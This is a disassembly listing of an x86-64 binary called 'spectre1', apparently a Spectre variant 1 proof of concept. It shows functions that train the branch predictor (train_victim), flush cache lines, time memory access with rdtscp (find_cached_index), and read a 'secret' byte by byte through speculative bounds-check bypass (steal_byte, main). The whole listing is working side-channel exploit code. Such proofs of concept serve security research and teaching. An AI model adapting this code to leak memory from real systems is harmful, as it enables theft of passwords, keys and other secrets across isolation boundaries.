
spectre1:     file format elf64-x86-64


Disassembly of section .init:

00000000000006b0 <_init>:
 6b0:	48 83 ec 08          	sub    $0x8,%rsp
 6b4:	48 8b 05 2d 19 20 00 	mov    0x20192d(%rip),%rax        # 201fe8 <__gmon_start__>
 6bb:	48 85 c0             	test   %rax,%rax
 6be:	74 02                	je     6c2 <_init+0x12>
 6c0:	ff d0                	callq  *%rax
 6c2:	48 83 c4 08          	add    $0x8,%rsp
 6c6:	c3                   	retq   

Disassembly of section .plt:

00000000000006d0 <.plt>:
 6d0:	ff 35 b2 18 20 00    	pushq  0x2018b2(%rip)        # 201f88 <_GLOBAL_OFFSET_TABLE_+0x8>
 6d6:	ff 25 b4 18 20 00    	jmpq   *0x2018b4(%rip)        # 201f90 <_GLOBAL_OFFSET_TABLE_+0x10>
 6dc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000006e0 <sigprocmask@plt>:
 6e0:	ff 25 b2 18 20 00    	jmpq   *0x2018b2(%rip)        # 201f98 <sigprocmask@GLIBC_2.2.5>
 6e6:	68 00 00 00 00       	pushq  $0x0
 6eb:	e9 e0 ff ff ff       	jmpq   6d0 <.plt>

00000000000006f0 <free@plt>:
 6f0:	ff 25 aa 18 20 00    	jmpq   *0x2018aa(%rip)        # 201fa0 <free@GLIBC_2.2.5>
 6f6:	68 01 00 00 00       	pushq  $0x1
 6fb:	e9 d0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000700 <__stack_chk_fail@plt>:
 700:	ff 25 a2 18 20 00    	jmpq   *0x2018a2(%rip)        # 201fa8 <__stack_chk_fail@GLIBC_2.4>
 706:	68 02 00 00 00       	pushq  $0x2
 70b:	e9 c0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000710 <printf@plt>:
 710:	ff 25 9a 18 20 00    	jmpq   *0x20189a(%rip)        # 201fb0 <printf@GLIBC_2.2.5>
 716:	68 03 00 00 00       	pushq  $0x3
 71b:	e9 b0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000720 <sigemptyset@plt>:
 720:	ff 25 92 18 20 00    	jmpq   *0x201892(%rip)        # 201fb8 <sigemptyset@GLIBC_2.2.5>
 726:	68 04 00 00 00       	pushq  $0x4
 72b:	e9 a0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000730 <malloc@plt>:
 730:	ff 25 8a 18 20 00    	jmpq   *0x20188a(%rip)        # 201fc0 <malloc@GLIBC_2.2.5>
 736:	68 05 00 00 00       	pushq  $0x5
 73b:	e9 90 ff ff ff       	jmpq   6d0 <.plt>

0000000000000740 <longjmp@plt>:
 740:	ff 25 82 18 20 00    	jmpq   *0x201882(%rip)        # 201fc8 <longjmp@GLIBC_2.2.5>
 746:	68 06 00 00 00       	pushq  $0x6
 74b:	e9 80 ff ff ff       	jmpq   6d0 <.plt>

0000000000000750 <sigaddset@plt>:
 750:	ff 25 7a 18 20 00    	jmpq   *0x20187a(%rip)        # 201fd0 <sigaddset@GLIBC_2.2.5>
 756:	68 07 00 00 00       	pushq  $0x7
 75b:	e9 70 ff ff ff       	jmpq   6d0 <.plt>

Disassembly of section .plt.got:

0000000000000760 <__cxa_finalize@plt>:
 760:	ff 25 92 18 20 00    	jmpq   *0x201892(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 766:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000770 <_start>:
 770:	31 ed                	xor    %ebp,%ebp
 772:	49 89 d1             	mov    %rdx,%r9
 775:	5e                   	pop    %rsi
 776:	48 89 e2             	mov    %rsp,%rdx
 779:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 77d:	50                   	push   %rax
 77e:	54                   	push   %rsp
 77f:	4c 8d 05 ea 05 00 00 	lea    0x5ea(%rip),%r8        # d70 <__libc_csu_fini>
 786:	48 8d 0d 73 05 00 00 	lea    0x573(%rip),%rcx        # d00 <__libc_csu_init>
 78d:	48 8d 3d 58 04 00 00 	lea    0x458(%rip),%rdi        # bec <main>
 794:	ff 15 46 18 20 00    	callq  *0x201846(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 79a:	f4                   	hlt    
 79b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000007a0 <deregister_tm_clones>:
 7a0:	48 8d 3d 69 19 20 00 	lea    0x201969(%rip),%rdi        # 202110 <__TMC_END__>
 7a7:	55                   	push   %rbp
 7a8:	48 8d 05 61 19 20 00 	lea    0x201961(%rip),%rax        # 202110 <__TMC_END__>
 7af:	48 39 f8             	cmp    %rdi,%rax
 7b2:	48 89 e5             	mov    %rsp,%rbp
 7b5:	74 19                	je     7d0 <deregister_tm_clones+0x30>
 7b7:	48 8b 05 1a 18 20 00 	mov    0x20181a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 7be:	48 85 c0             	test   %rax,%rax
 7c1:	74 0d                	je     7d0 <deregister_tm_clones+0x30>
 7c3:	5d                   	pop    %rbp
 7c4:	ff e0                	jmpq   *%rax
 7c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 7cd:	00 00 00 
 7d0:	5d                   	pop    %rbp
 7d1:	c3                   	retq   
 7d2:	0f 1f 40 00          	nopl   0x0(%rax)
 7d6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 7dd:	00 00 00 

00000000000007e0 <register_tm_clones>:
 7e0:	48 8d 3d 29 19 20 00 	lea    0x201929(%rip),%rdi        # 202110 <__TMC_END__>
 7e7:	48 8d 35 22 19 20 00 	lea    0x201922(%rip),%rsi        # 202110 <__TMC_END__>
 7ee:	55                   	push   %rbp
 7ef:	48 29 fe             	sub    %rdi,%rsi
 7f2:	48 89 e5             	mov    %rsp,%rbp
 7f5:	48 c1 fe 03          	sar    $0x3,%rsi
 7f9:	48 89 f0             	mov    %rsi,%rax
 7fc:	48 c1 e8 3f          	shr    $0x3f,%rax
 800:	48 01 c6             	add    %rax,%rsi
 803:	48 d1 fe             	sar    %rsi
 806:	74 18                	je     820 <register_tm_clones+0x40>
 808:	48 8b 05 e1 17 20 00 	mov    0x2017e1(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 80f:	48 85 c0             	test   %rax,%rax
 812:	74 0c                	je     820 <register_tm_clones+0x40>
 814:	5d                   	pop    %rbp
 815:	ff e0                	jmpq   *%rax
 817:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 81e:	00 00 
 820:	5d                   	pop    %rbp
 821:	c3                   	retq   
 822:	0f 1f 40 00          	nopl   0x0(%rax)
 826:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 82d:	00 00 00 

0000000000000830 <__do_global_dtors_aux>:
 830:	80 3d e9 18 20 00 00 	cmpb   $0x0,0x2018e9(%rip)        # 202120 <completed.7697>
 837:	75 2f                	jne    868 <__do_global_dtors_aux+0x38>
 839:	48 83 3d b7 17 20 00 	cmpq   $0x0,0x2017b7(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 840:	00 
 841:	55                   	push   %rbp
 842:	48 89 e5             	mov    %rsp,%rbp
 845:	74 0c                	je     853 <__do_global_dtors_aux+0x23>
 847:	48 8b 3d ba 17 20 00 	mov    0x2017ba(%rip),%rdi        # 202008 <__dso_handle>
 84e:	e8 0d ff ff ff       	callq  760 <__cxa_finalize@plt>
 853:	e8 48 ff ff ff       	callq  7a0 <deregister_tm_clones>
 858:	c6 05 c1 18 20 00 01 	movb   $0x1,0x2018c1(%rip)        # 202120 <completed.7697>
 85f:	5d                   	pop    %rbp
 860:	c3                   	retq   
 861:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 868:	f3 c3                	repz retq 
 86a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000870 <frame_dummy>:
 870:	55                   	push   %rbp
 871:	48 89 e5             	mov    %rsp,%rbp
 874:	5d                   	pop    %rbp
 875:	e9 66 ff ff ff       	jmpq   7e0 <register_tm_clones>

000000000000087a <victim_function>:
 87a:	55                   	push   %rbp
 87b:	48 89 e5             	mov    %rsp,%rbp
 87e:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 882:	8b 05 98 17 20 00    	mov    0x201798(%rip),%eax        # 202020 <bufferSize>
 888:	48 98                	cltq   
 88a:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 88e:	73 34                	jae    8c4 <victim_function+0x4a>
 890:	48 8d 15 a9 17 20 00 	lea    0x2017a9(%rip),%rdx        # 202040 <buffer>
 897:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 89b:	48 01 d0             	add    %rdx,%rax
 89e:	0f b6 00             	movzbl (%rax),%eax
 8a1:	0f b6 c0             	movzbl %al,%eax
 8a4:	c1 e0 0c             	shl    $0xc,%eax
 8a7:	48 63 d0             	movslq %eax,%rdx
 8aa:	48 8d 05 8f 19 20 00 	lea    0x20198f(%rip),%rax        # 202240 <array>
 8b1:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 8b5:	0f b6 05 88 18 20 00 	movzbl 0x201888(%rip),%eax        # 202144 <temp>
 8bc:	21 d0                	and    %edx,%eax
 8be:	88 05 80 18 20 00    	mov    %al,0x201880(%rip)        # 202144 <temp>
 8c4:	90                   	nop
 8c5:	5d                   	pop    %rbp
 8c6:	c3                   	retq   

00000000000008c7 <unblock_signal>:
 8c7:	55                   	push   %rbp
 8c8:	48 89 e5             	mov    %rsp,%rbp
 8cb:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
 8d2:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%rbp)
 8d8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 8df:	00 00 
 8e1:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 8e5:	31 c0                	xor    %eax,%eax
 8e7:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 8ee:	48 89 c7             	mov    %rax,%rdi
 8f1:	e8 2a fe ff ff       	callq  720 <sigemptyset@plt>
 8f6:	8b 95 6c ff ff ff    	mov    -0x94(%rbp),%edx
 8fc:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 903:	89 d6                	mov    %edx,%esi
 905:	48 89 c7             	mov    %rax,%rdi
 908:	e8 43 fe ff ff       	callq  750 <sigaddset@plt>
 90d:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 914:	ba 00 00 00 00       	mov    $0x0,%edx
 919:	48 89 c6             	mov    %rax,%rsi
 91c:	bf 01 00 00 00       	mov    $0x1,%edi
 921:	e8 ba fd ff ff       	callq  6e0 <sigprocmask@plt>
 926:	90                   	nop
 927:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 92b:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 932:	00 00 
 934:	74 05                	je     93b <unblock_signal+0x74>
 936:	e8 c5 fd ff ff       	callq  700 <__stack_chk_fail@plt>
 93b:	c9                   	leaveq 
 93c:	c3                   	retq   

000000000000093d <trycatch_segfault_handler>:
 93d:	55                   	push   %rbp
 93e:	48 89 e5             	mov    %rsp,%rbp
 941:	48 83 ec 10          	sub    $0x10,%rsp
 945:	89 7d fc             	mov    %edi,-0x4(%rbp)
 948:	bf 0b 00 00 00       	mov    $0xb,%edi
 94d:	e8 75 ff ff ff       	callq  8c7 <unblock_signal>
 952:	bf 08 00 00 00       	mov    $0x8,%edi
 957:	e8 6b ff ff ff       	callq  8c7 <unblock_signal>
 95c:	be 01 00 00 00       	mov    $0x1,%esi
 961:	48 8d 3d f8 17 20 00 	lea    0x2017f8(%rip),%rdi        # 202160 <trycatch_buf>
 968:	e8 d3 fd ff ff       	callq  740 <longjmp@plt>

000000000000096d <find_cached_index>:
 96d:	55                   	push   %rbp
 96e:	48 89 e5             	mov    %rsp,%rbp
 971:	53                   	push   %rbx
 972:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
 976:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 97d:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 984:	eb 7b                	jmp    a01 <find_cached_index+0x94>
 986:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 98d:	00 
 98e:	8b 45 e8             	mov    -0x18(%rbp),%eax
 991:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
 997:	83 c0 0d             	add    $0xd,%eax
 99a:	25 ff 00 00 00       	and    $0xff,%eax
 99f:	89 45 ec             	mov    %eax,-0x14(%rbp)
 9a2:	8b 45 ec             	mov    -0x14(%rbp),%eax
 9a5:	c1 e0 0c             	shl    $0xc,%eax
 9a8:	48 63 d0             	movslq %eax,%rdx
 9ab:	48 8d 05 8e 18 20 00 	lea    0x20188e(%rip),%rax        # 202240 <array>
 9b2:	48 01 d0             	add    %rdx,%rax
 9b5:	48 89 c3             	mov    %rax,%rbx
 9b8:	0f ae f0             	mfence 
 9bb:	0f 01 f9             	rdtscp 
 9be:	49 89 c2             	mov    %rax,%r10
 9c1:	48 8b 0b             	mov    (%rbx),%rcx
 9c4:	0f 01 f9             	rdtscp 
 9c7:	4c 29 d0             	sub    %r10,%rax
 9ca:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 9ce:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 9d3:	77 28                	ja     9fd <find_cached_index+0x90>
 9d5:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
 9d9:	74 22                	je     9fd <find_cached_index+0x90>
 9db:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%rbp)
 9e2:	8b 45 ec             	mov    -0x14(%rbp),%eax
 9e5:	48 98                	cltq   
 9e7:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 9ee:	00 
 9ef:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
 9f3:	48 01 d0             	add    %rdx,%rax
 9f6:	8b 10                	mov    (%rax),%edx
 9f8:	83 c2 01             	add    $0x1,%edx
 9fb:	89 10                	mov    %edx,(%rax)
 9fd:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 a01:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 a08:	0f 8e 78 ff ff ff    	jle    986 <find_cached_index+0x19>
 a0e:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 a11:	5b                   	pop    %rbx
 a12:	5d                   	pop    %rbp
 a13:	c3                   	retq   

0000000000000a14 <find_highest_score>:
 a14:	55                   	push   %rbp
 a15:	48 89 e5             	mov    %rsp,%rbp
 a18:	48 83 ec 20          	sub    $0x20,%rsp
 a1c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 a20:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 a27:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 a2e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 a35:	eb 3e                	jmp    a75 <find_highest_score+0x61>
 a37:	8b 45 fc             	mov    -0x4(%rbp),%eax
 a3a:	48 98                	cltq   
 a3c:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a43:	00 
 a44:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 a48:	48 01 d0             	add    %rdx,%rax
 a4b:	8b 00                	mov    (%rax),%eax
 a4d:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 a50:	7d 1f                	jge    a71 <find_highest_score+0x5d>
 a52:	8b 45 fc             	mov    -0x4(%rbp),%eax
 a55:	89 45 f8             	mov    %eax,-0x8(%rbp)
 a58:	8b 45 fc             	mov    -0x4(%rbp),%eax
 a5b:	48 98                	cltq   
 a5d:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a64:	00 
 a65:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 a69:	48 01 d0             	add    %rdx,%rax
 a6c:	8b 00                	mov    (%rax),%eax
 a6e:	89 45 f4             	mov    %eax,-0xc(%rbp)
 a71:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 a75:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 a7c:	7e b9                	jle    a37 <find_highest_score+0x23>
 a7e:	8b 35 bc 16 20 00    	mov    0x2016bc(%rip),%esi        # 202140 <try>
 a84:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 a87:	8b 55 f8             	mov    -0x8(%rbp),%edx
 a8a:	8b 45 f8             	mov    -0x8(%rbp),%eax
 a8d:	41 89 f0             	mov    %esi,%r8d
 a90:	89 c6                	mov    %eax,%esi
 a92:	48 8d 3d ef 02 00 00 	lea    0x2ef(%rip),%rdi        # d88 <_IO_stdin_used+0x8>
 a99:	b8 00 00 00 00       	mov    $0x0,%eax
 a9e:	e8 6d fc ff ff       	callq  710 <printf@plt>
 aa3:	90                   	nop
 aa4:	c9                   	leaveq 
 aa5:	c3                   	retq   

0000000000000aa6 <train_victim>:
 aa6:	55                   	push   %rbp
 aa7:	48 89 e5             	mov    %rsp,%rbp
 aaa:	48 83 ec 10          	sub    $0x10,%rsp
 aae:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 ab5:	eb 6b                	jmp    b22 <train_victim+0x7c>
 ab7:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 aba:	ba 67 66 66 66       	mov    $0x66666667,%edx
 abf:	89 c8                	mov    %ecx,%eax
 ac1:	f7 ea                	imul   %edx
 ac3:	c1 fa 02             	sar    $0x2,%edx
 ac6:	89 c8                	mov    %ecx,%eax
 ac8:	c1 f8 1f             	sar    $0x1f,%eax
 acb:	29 c2                	sub    %eax,%edx
 acd:	89 d0                	mov    %edx,%eax
 acf:	c1 e0 02             	shl    $0x2,%eax
 ad2:	01 d0                	add    %edx,%eax
 ad4:	01 c0                	add    %eax,%eax
 ad6:	29 c1                	sub    %eax,%ecx
 ad8:	89 ca                	mov    %ecx,%edx
 ada:	48 63 c2             	movslq %edx,%rax
 add:	48 89 c7             	mov    %rax,%rdi
 ae0:	e8 95 fd ff ff       	callq  87a <victim_function>
 ae5:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 aec:	eb 1a                	jmp    b08 <train_victim+0x62>
 aee:	8b 45 f8             	mov    -0x8(%rbp),%eax
 af1:	c1 e0 0c             	shl    $0xc,%eax
 af4:	48 63 d0             	movslq %eax,%rdx
 af7:	48 8d 05 42 17 20 00 	lea    0x201742(%rip),%rax        # 202240 <array>
 afe:	48 01 d0             	add    %rdx,%rax
 b01:	0f ae 38             	clflush (%rax)
 b04:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 b08:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 b0f:	7e dd                	jle    aee <train_victim+0x48>
 b11:	0f ae f0             	mfence 
 b14:	48 8d 05 05 15 20 00 	lea    0x201505(%rip),%rax        # 202020 <bufferSize>
 b1b:	0f ae 38             	clflush (%rax)
 b1e:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 b22:	83 7d f4 1d          	cmpl   $0x1d,-0xc(%rbp)
 b26:	7e 8f                	jle    ab7 <train_victim+0x11>
 b28:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 b2f:	eb 1a                	jmp    b4b <train_victim+0xa5>
 b31:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b34:	c1 e0 0c             	shl    $0xc,%eax
 b37:	48 63 d0             	movslq %eax,%rdx
 b3a:	48 8d 05 ff 16 20 00 	lea    0x2016ff(%rip),%rax        # 202240 <array>
 b41:	48 01 d0             	add    %rdx,%rax
 b44:	0f ae 38             	clflush (%rax)
 b47:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 b4b:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 b52:	7e dd                	jle    b31 <train_victim+0x8b>
 b54:	0f ae f0             	mfence 
 b57:	48 8d 05 c2 14 20 00 	lea    0x2014c2(%rip),%rax        # 202020 <bufferSize>
 b5e:	0f ae 38             	clflush (%rax)
 b61:	90                   	nop
 b62:	c9                   	leaveq 
 b63:	c3                   	retq   

0000000000000b64 <steal_byte>:
 b64:	55                   	push   %rbp
 b65:	48 89 e5             	mov    %rsp,%rbp
 b68:	48 83 ec 20          	sub    $0x20,%rsp
 b6c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 b70:	89 75 e4             	mov    %esi,-0x1c(%rbp)
 b73:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 b7a:	eb 4e                	jmp    bca <steal_byte+0x66>
 b7c:	b8 00 00 00 00       	mov    $0x0,%eax
 b81:	e8 20 ff ff ff       	callq  aa6 <train_victim>
 b86:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 b89:	48 98                	cltq   
 b8b:	48 89 c7             	mov    %rax,%rdi
 b8e:	e8 e7 fc ff ff       	callq  87a <victim_function>
 b93:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 b97:	48 89 c7             	mov    %rax,%rdi
 b9a:	e8 ce fd ff ff       	callq  96d <find_cached_index>
 b9f:	89 45 fc             	mov    %eax,-0x4(%rbp)
 ba2:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
 ba6:	75 13                	jne    bbb <steal_byte+0x57>
 ba8:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
 bac:	8b 05 8e 15 20 00    	mov    0x20158e(%rip),%eax        # 202140 <try>
 bb2:	83 c0 01             	add    $0x1,%eax
 bb5:	89 05 85 15 20 00    	mov    %eax,0x201585(%rip)        # 202140 <try>
 bbb:	8b 05 7f 15 20 00    	mov    0x20157f(%rip),%eax        # 202140 <try>
 bc1:	83 f8 0a             	cmp    $0xa,%eax
 bc4:	74 0c                	je     bd2 <steal_byte+0x6e>
 bc6:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 bca:	83 7d f8 09          	cmpl   $0x9,-0x8(%rbp)
 bce:	7e ac                	jle    b7c <steal_byte+0x18>
 bd0:	eb 01                	jmp    bd3 <steal_byte+0x6f>
 bd2:	90                   	nop
 bd3:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 bd7:	48 89 c7             	mov    %rax,%rdi
 bda:	e8 35 fe ff ff       	callq  a14 <find_highest_score>
 bdf:	c7 05 57 15 20 00 00 	movl   $0x0,0x201557(%rip)        # 202140 <try>
 be6:	00 00 00 
 be9:	90                   	nop
 bea:	c9                   	leaveq 
 beb:	c3                   	retq   

0000000000000bec <main>:
 bec:	55                   	push   %rbp
 bed:	48 89 e5             	mov    %rsp,%rbp
 bf0:	48 83 ec 20          	sub    $0x20,%rsp
 bf4:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 bfb:	eb 24                	jmp    c21 <main+0x35>
 bfd:	8b 45 e0             	mov    -0x20(%rbp),%eax
 c00:	99                   	cltd   
 c01:	c1 ea 18             	shr    $0x18,%edx
 c04:	01 d0                	add    %edx,%eax
 c06:	0f b6 c0             	movzbl %al,%eax
 c09:	29 d0                	sub    %edx,%eax
 c0b:	89 c1                	mov    %eax,%ecx
 c0d:	8b 45 e0             	mov    -0x20(%rbp),%eax
 c10:	48 63 d0             	movslq %eax,%rdx
 c13:	48 8d 05 26 16 20 00 	lea    0x201626(%rip),%rax        # 202240 <array>
 c1a:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 c1d:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 c21:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 c28:	7e d3                	jle    bfd <main+0x11>
 c2a:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 c31:	e9 b1 00 00 00       	jmpq   ce7 <main+0xfb>
 c36:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 c3d:	eb 1a                	jmp    c59 <main+0x6d>
 c3f:	8b 45 e8             	mov    -0x18(%rbp),%eax
 c42:	c1 e0 0c             	shl    $0xc,%eax
 c45:	48 63 d0             	movslq %eax,%rdx
 c48:	48 8d 05 f1 15 20 00 	lea    0x2015f1(%rip),%rax        # 202240 <array>
 c4f:	48 01 d0             	add    %rdx,%rax
 c52:	0f ae 38             	clflush (%rax)
 c55:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 c59:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 c60:	7e dd                	jle    c3f <main+0x53>
 c62:	0f ae f0             	mfence 
 c65:	bf 00 04 00 00       	mov    $0x400,%edi
 c6a:	e8 c1 fa ff ff       	callq  730 <malloc@plt>
 c6f:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 c73:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 c7a:	eb 1e                	jmp    c9a <main+0xae>
 c7c:	8b 45 ec             	mov    -0x14(%rbp),%eax
 c7f:	48 98                	cltq   
 c81:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 c88:	00 
 c89:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 c8d:	48 01 d0             	add    %rdx,%rax
 c90:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 c96:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 c9a:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 ca1:	7e d9                	jle    c7c <main+0x90>
 ca3:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 ca6:	48 98                	cltq   
 ca8:	48 8d 0d 31 14 20 00 	lea    0x201431(%rip),%rcx        # 2020e0 <secret>
 caf:	48 8d 15 8a 13 20 00 	lea    0x20138a(%rip),%rdx        # 202040 <buffer>
 cb6:	48 29 d1             	sub    %rdx,%rcx
 cb9:	48 89 ca             	mov    %rcx,%rdx
 cbc:	48 01 d0             	add    %rdx,%rax
 cbf:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 cc3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 cc7:	89 c2                	mov    %eax,%edx
 cc9:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 ccd:	89 d6                	mov    %edx,%esi
 ccf:	48 89 c7             	mov    %rax,%rdi
 cd2:	e8 8d fe ff ff       	callq  b64 <steal_byte>
 cd7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 cdb:	48 89 c7             	mov    %rax,%rdi
 cde:	e8 0d fa ff ff       	callq  6f0 <free@plt>
 ce3:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 ce7:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 ceb:	0f 8e 45 ff ff ff    	jle    c36 <main+0x4a>
 cf1:	b8 00 00 00 00       	mov    $0x0,%eax
 cf6:	c9                   	leaveq 
 cf7:	c3                   	retq   
 cf8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 cff:	00 

0000000000000d00 <__libc_csu_init>:
 d00:	41 57                	push   %r15
 d02:	41 56                	push   %r14
 d04:	49 89 d7             	mov    %rdx,%r15
 d07:	41 55                	push   %r13
 d09:	41 54                	push   %r12
 d0b:	4c 8d 25 6e 10 20 00 	lea    0x20106e(%rip),%r12        # 201d80 <__frame_dummy_init_array_entry>
 d12:	55                   	push   %rbp
 d13:	48 8d 2d 6e 10 20 00 	lea    0x20106e(%rip),%rbp        # 201d88 <__init_array_end>
 d1a:	53                   	push   %rbx
 d1b:	41 89 fd             	mov    %edi,%r13d
 d1e:	49 89 f6             	mov    %rsi,%r14
 d21:	4c 29 e5             	sub    %r12,%rbp
 d24:	48 83 ec 08          	sub    $0x8,%rsp
 d28:	48 c1 fd 03          	sar    $0x3,%rbp
 d2c:	e8 7f f9 ff ff       	callq  6b0 <_init>
 d31:	48 85 ed             	test   %rbp,%rbp
 d34:	74 20                	je     d56 <__libc_csu_init+0x56>
 d36:	31 db                	xor    %ebx,%ebx
 d38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 d3f:	00 
 d40:	4c 89 fa             	mov    %r15,%rdx
 d43:	4c 89 f6             	mov    %r14,%rsi
 d46:	44 89 ef             	mov    %r13d,%edi
 d49:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 d4d:	48 83 c3 01          	add    $0x1,%rbx
 d51:	48 39 dd             	cmp    %rbx,%rbp
 d54:	75 ea                	jne    d40 <__libc_csu_init+0x40>
 d56:	48 83 c4 08          	add    $0x8,%rsp
 d5a:	5b                   	pop    %rbx
 d5b:	5d                   	pop    %rbp
 d5c:	41 5c                	pop    %r12
 d5e:	41 5d                	pop    %r13
 d60:	41 5e                	pop    %r14
 d62:	41 5f                	pop    %r15
 d64:	c3                   	retq   
 d65:	90                   	nop
 d66:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 d6d:	00 00 00 

0000000000000d70 <__libc_csu_fini>:
 d70:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000d74 <_fini>:
 d74:	48 83 ec 08          	sub    $0x8,%rsp
 d78:	48 83 c4 08          	add    $0x8,%rsp
 d7c:	c3                   	retq   
